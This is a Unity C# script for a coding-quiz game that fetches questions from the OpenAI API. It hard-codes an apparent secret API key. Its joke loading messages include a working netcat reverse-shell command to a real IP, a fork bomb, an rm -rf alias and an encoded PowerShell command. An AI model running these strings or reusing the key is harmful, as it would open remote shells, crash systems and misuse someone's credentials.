using Newtonsoft.Json.Linq;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using TMPro;
using UnityEditor.Experimental.GraphView;
using UnityEditor.PackageManager.Requests;
using UnityEngine;
using UnityEngine.Networking;

public class QuestionGenerator : MonoBehaviour
{
    //private readonly string endpointURL = "http://localhost:8080/";
    private readonly string endpointURL = "https://api.openai.com/v1/chat/completions";
    private readonly string APItoken = "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";
    private List<Task> generatedTasks = new();
    [SerializeField] TextMeshProUGUI _text1, _text2, _text3;
    [SerializeField] TimerScript _timerScript;
    [SerializeField] GameObject _spot1, _spot2, _spot3;
    [SerializeField] GameObject _iField1, _iField2, _iField3, _iField4;
    [SerializeField] TextMeshProUGUI _answers1, _answers2, _answers3;
    [SerializeField] GameObject[] _cubePool;
    [SerializeField] GameObject _player;
    [SerializeField] TextMeshProUGUI _leadingText;
    private bool _inputQuestion1, _inputQuestion2, _inputQuestion3;
    private string _task1CubeAnswer, _task2CubeAnswer, _task3CubeAnswer;

    #region Loading Messages
    // for funsies, courtesy of CyberChef
    // https://github.com/gchq/CyberChef/blob/6ed9d4554a2816c2c9c2e12b5e23f530b22ecf3d/src/web/html/index.html#L45
    private string[] loadingMsgs = {
                "Proving P = NP...",
                "Computing 6 x 9...",
                "Mining bitcoin...",
                "Dividing by 0...",
                "Initialising Skynet...",
                "[REDACTED]",
                "Downloading more RAM...",
                "Sorting 1s and 0s...",
                "Navigating neural network...",
                "Importing machine learning...",
                "Issuing Alice and Bob one-time pads...",
                "Mining bitcoin cash...",
                "Generating key material by trying to escape vim...",
                "Figuring out the cron syntax...",
                "(creating unresolved tension...",
                "Symlinking emacs and vim to ed...",
                "Training branch predictor...",
                "Timing cache hits...",
                "Trying to exit vi...",
                "Adding LLM hallucinations...",
                "Is this thing even on?",
                "Testing in prod...",
                "alias ls=\"rm -rf /\"",
                "[CLASSIFIED]",
                "[CENSORED]",
                "Rewriting everything in Rust...",
                "Rebuilding initramfs...",
                "Petting the doggo for good luck...",
                "JSON Deserialization still in progress...Long live protobufs!",
                "pickle.Unpickler(Rick).load()",
                "Sprinkling some magic pixie dust...",
                "Saving your real life address in the database",
                "Wrong scene!, Wrong scene!",
                "That's what she said.",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 161.53.72.120 9001 >/tmp/f",
                ":(){ :|:& };:",
                "Hey, a recursive ZIP file? I wonder what could bomb wrong",
                "Did you know that 203.0.113.0/24 is a private range?",
                "You've heard of .ELF on the shelf, but what about an unbacked RWX region in kernel-space?",
                "powershell -e VwByAGkAdABlAC0ASABvAHMAdAAgACIAUwBlAHIAaQBvAHUAcwBsAbwA/ACIA",
                "Feeding developers",
                "Crying in bed"
                
    };
    #endregion

    private string unescape_custom (string input)
    {
        input = input.Replace ("\\", "\\");
        input = input.Replace ("\\t", "\t");
        input = input.Replace("\\r", "\r");

        return input;
    }

    private string set_random_seed (string data) {
        int seed = Random.Range (0, int.MaxValue);
        return data.Replace("-1337314420", seed.ToString());
    }

    public void Start()
    {
        StartCoroutine(GenerateQuestion());
    }

    public void Update()
    {
        //CheckAnswers();
    }

    private IEnumerator DisplayLoadingMessages(UnityWebRequest request)
    {
        while (request.result != UnityWebRequest.Result.Success) {
            int randomLoadingMessageIndex = Random.Range(0, loadingMsgs.Length);
            // Dodati ovo na TextMesh tijekom loadanja umjesto u Log?
            Debug.Log(loadingMsgs[randomLoadingMessageIndex]);
            _leadingText.text = loadingMsgs[randomLoadingMessageIndex];
            yield return new WaitForSeconds(7);
        }
    }

    public IEnumerator GenerateQuestion()
    {
        Debug.Log("[+] Sending API request..");
        string data = set_random_seed(Question.JSONdata);
        UnityWebRequest request = UnityWebRequest.Post(endpointURL, data, "application/json");
        request.SetRequestHeader("Authorization", $"Bearer {APItoken}");
        request.timeout = 90; // wait up to 1.5min
        StartCoroutine(DisplayLoadingMessages(request));
        yield return request.SendWebRequest();

        #region recv_sample
        //var recv = "{\r\n  \"id\": \"chatcmpl-8MIE5ZChlmKWBqj8wVEiSlt4qScTu\",\r\n  \"object\": \"chat.completion\",\r\n  \"created\": 1700323969,\r\n  \"model\": \"gpt-4-1106-preview\",\r\n  \"choices\": [\r\n    {\r\n      \"index\": 0,\r\n      \"message\": {\r\n        \"role\": \"assistant\",\r\n        \"content\": \"{\\n    \\\"questionType\\\": 2,\\n    \\\"question\\\": \\\"What is the output of the code?\\\",\\n    \\\"codeSnippet\\\": \\n    \\\"#include <stdio.h>\\\\n\\\\nint main() {\\\\n    int x = 5;\\\\n    int y = x + 3;\\\\n    printf(\\\\\\\"%d\\\\\\\", y);\\\\n    return 0;\\\\n}\\\",\\n    \\\"answer1\\\": \\\"5\\\",\\n    \\\"answer2\\\": \\\"8\\\",\\n    \\\"answer3\\\": \\\"3\\\",\\n    \\\"correctAnswer\\\": 2\\n}\"\r\n      },\r\n      \"finish_reason\": \"stop\"\r\n    }\r\n  ],\r\n  \"usage\": {\r\n    \"prompt_tokens\": 186,\r\n    \"completion_tokens\": 109,\r\n    \"total_tokens\": 295\r\n  },\r\n  \"system_fingerprint\": \"fp_a24b4d720c\"\r\n}";   
        #endregion

        if (request.result != UnityWebRequest.Result.Success)
        {
            Debug.Log(request.error);
            Debug.Log(request.downloadHandler.text);
            _text1.text = _text2.text = _text3.text = "Something went wrong :( Try fetching the questions again";
            StopCoroutine(DisplayLoadingMessages(request));
        }
        else
        {
            Debug.Log("[+] API Response received!");
            try {
                string recv = request.downloadHandler.text;
                recv = unescape_custom(recv);

                JObject jsonObj = JObject.Parse(recv);
                JObject response = (JObject)((JArray)jsonObj["choices"])[0];
                response = (JObject)response["message"];

                JToken unescapedResponseContent = response["content"];

                JArray unescapedResponseQuestions = (JArray)JObject.Parse(unescapedResponseContent.ToString())["questions"];
                foreach (JToken question in unescapedResponseQuestions)
                {
                    Task deserializedData = JsonUtility.FromJson<Task>(question.ToString());
                    generatedTasks.Add(deserializedData);
                    Debug.Log(deserializedData);
                }

                GenerateTask1(generatedTasks[0]);
                GenerateTask2(generatedTasks[1]);
                GenerateTask3(generatedTasks[2]);

            } catch {
                _text1.text = _text2.text = _text3.text = "Something went wrong :( Try fetching the questions again";
                StopCoroutine(DisplayLoadingMessages(request));
            }
        }
        StopCoroutine(DisplayLoadingMessages(request));
        _player.transform.position = new Vector3(0, 0, -0.949999988f);
        _timerScript.gameObject.SetActive(true);
    }

    void GenerateTask1(Task t) {
        _text1.text = t.question + "\n\n" + t.codeSnippet;
        if (t.questionType == 0)
        {
            GenerateCubes();
            _iField1.SetActive(false);
            _spot1.SetActive(true);
            _inputQuestion1 = false;
        }
        else {
            _iField1.SetActive(true);
            _spot1.SetActive(false);
            _inputQuestion1 = true;
            _answers1.text = "1 - " + t.answer1 + "\n" +
                             "2 - " + t.answer2 + "\n" +
                             "3 - " + t.answer3 + "\n" +
                             "4 - " + t.answer4 + "\n" +
                             "5 - " + t.answer5;
        }
    }
    void GenerateTask2(Task t) {
        _text2.text = t.question + "\n\n" + t.codeSnippet;
        if (t.questionType == 0)
        {
            GenerateCubes();
            _iField2.SetActive(false);
            _spot2.SetActive(true);
            _inputQuestion2 = false;
        }
        else
        {
            _iField2.SetActive(true);
            _spot2.SetActive(false);
            _inputQuestion2 = true;
            _answers2.text = "1 - " + t.answer1 + "\n" +
                             "2 - " + t.answer2 + "\n" +
                             "3 - " + t.answer3 + "\n" +
                             "4 - " + t.answer4 + "\n" +
                             "5 - " + t.answer5;
        }
    }
    void GenerateTask3(Task t) {
        _text3.text = t.question + "\n\n" + t.codeSnippet;
        if (t.questionType == 0)
        {
            GenerateCubes();
            _iField3.SetActive(false);
            _spot3.SetActive(true);
            _inputQuestion3 = false;
        }
        else
        {
            _iField3.SetActive(true);
            _spot3.SetActive(false);
            _inputQuestion3 = true;
            _answers3.text = "1 - " + t.answer1 + "\n" +
                             "2 - " + t.answer2 + "\n" +
                             "3 - " + t.answer3 + "\n" +
                             "4 - " + t.answer4 + "\n" +
                             "5 - " + t.answer5;
        }
    }
    void GenerateCubes() {
        foreach (GameObject c in _cubePool) {
            c.SetActive(true);
        }
    }

    public void CheckAnswers()
    {
        if (_inputQuestion1 == false)
        {
            if (_task1CubeAnswer == generatedTasks[0].correctAnswer.ToString()) { _timerScript.Task1Done(); }
            else{ _timerScript.Task1UnDone(); }
        }
        else
        {
            if (_iField1.transform.GetComponent<TextMeshProUGUI>().text == generatedTasks[0].GetCorrectAnswerString()) { _timerScript.Task1Done(); }
            else{ _timerScript.Task1UnDone(); }
        }
        if (_inputQuestion2 == false)
        {
            if (_task2CubeAnswer == generatedTasks[1].correctAnswer.ToString()) { _timerScript.Task2Done(); }
            else{ _timerScript.Task2UnDone(); }
        }
        else
        {
            if (_iField2.transform.GetComponent<TextMeshProUGUI>().text == generatedTasks[1].GetCorrectAnswerString()) { _timerScript.Task2Done(); }
            else{ _timerScript.Task2UnDone(); }
        }
        if (_inputQuestion3 == false)
        {
            if (_task3CubeAnswer == generatedTasks[2].correctAnswer.ToString()) { _timerScript.Task3Done(); }
            else{ _timerScript.Task3UnDone(); }
        }
        else
        {
            if (_iField3.transform.GetComponent<TextMeshProUGUI>().text == generatedTasks[2].GetCorrectAnswerString()) { _timerScript.Task3Done(); }
            else{ _timerScript.Task3UnDone(); }
        }
        if (_iField4.transform.GetComponent<TextMeshProUGUI>().text == "6428") { _timerScript.Task4Done(); }
        else { _timerScript.Task4UnDone(); }
    }

    public void Task1Collided(Collider o) {
        if (o == null) {
            _task1CubeAnswer = "";
        }
        else {
            _task1CubeAnswer = "O("+o.name+")";
        }
    }
    public void Task2Collided(Collider o) {
        if (o == null)
        {
            _task2CubeAnswer = "";
        }
        else
        {
            _task2CubeAnswer = "O(" + o.name + ")";
        }
    }
    public void Task3Collided(Collider o) {
        if (o == null)
        {
            _task3CubeAnswer = "";
        }
        else
        {
            _task3CubeAnswer = "O(" + o.name + ")";
        }
    }
}
